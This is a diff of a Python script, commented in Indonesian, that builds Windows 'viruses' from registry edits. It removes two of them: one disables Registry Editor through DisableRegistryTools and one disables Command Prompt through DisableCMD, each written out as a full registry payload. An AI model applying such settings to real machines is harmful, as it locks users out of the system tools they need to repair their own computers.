@@ -25,29 +25,3 @@ virus1 = {
 
 # menjalankan fungsi buat_virus dan memecah setiap key yang ada di object virus1 untuk dijadikan parameter di fungsi buat_virus
 create_virus(**virus1)
-
-# virus2
-# 2. Mendisable Registry Editor
-# Ahmad Zaeni Imron
-virus2 = {
-    'root_key': reg.HKEY_CURRENT_USER,
-    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-    'key_name': 'DisableRegistryTools',
-    'value_type': reg.REG_DWORD,
-    'value': 1
-}
-
-create_virus(**virus2)
-
-#virus3
-# 3. Mendisable Command Prompt
-# Ahmad Zaeni Imron
-virus3 = {
-    'root_key': reg.HKEY_CURRENT_USER,
-    'key_path': 'SOFTWARE\\Policies\\Microsoft\\Windows\\System',
-    'key_name': 'DisableCMD',
-    'value_type': reg.REG_DWORD,
-    'value': 2
-}
-
-create_virus(**virus3)
